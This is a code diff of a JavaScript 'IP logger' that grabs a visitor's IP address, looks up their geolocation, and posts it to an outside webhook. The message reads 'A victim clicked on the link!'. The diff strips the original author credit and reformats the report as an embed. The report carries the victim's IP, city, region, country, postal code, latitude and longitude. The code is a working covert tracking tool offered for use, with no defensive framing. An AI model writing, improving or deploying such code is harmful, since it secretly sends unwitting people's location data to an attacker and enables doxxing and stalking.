@@ -1,5 +1,3 @@
-// give all credit to elk
-// https://github.com/3elk/Website-IP-Logger
 const sendIP = () => {
     fetch('https://api.ipify.org?format=json')
         .then(ipResponse => ipResponse.json())
@@ -17,7 +15,14 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "site logger <3", // optionally changeable
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `A victim clicked on the link! @here\n=====================\nIP Address >> ${ipadd}\nNetwork >> ${geoData.network}\nCountry >> ${geoData.country_code}/${geoData.country_name}\nRegion/State >> ${geoData.region}\nCity/Town >> ${geoData.city}\nLatitude >> ${geoData.latitude}\nLongitude >> ${geoData.longitude}\nTimeZone >> ${geoData.timezone}\nPostal Code >> ${geoData.postal}\nLanguages >> ${geoData.languages}\nCurrency >> ${geoData.currency}/${geoData.currency_name}\nASN >> ${geoData.asn}\nORG >> ${geoData.org}\n=====================\nᓚᘏᗢ - e l k w a s h e r e -`
+                            content: `@here`,
+                            embeds: [
+                                {
+                                    title: 'A victim clicked on the link!',
+                                    description: `**IP Address:** ${ipadd}\n**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}\n**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`,
+                                    color: 0x800080 // optionally changeable
+                                }
+                            ]
                         })
                     });
                 });
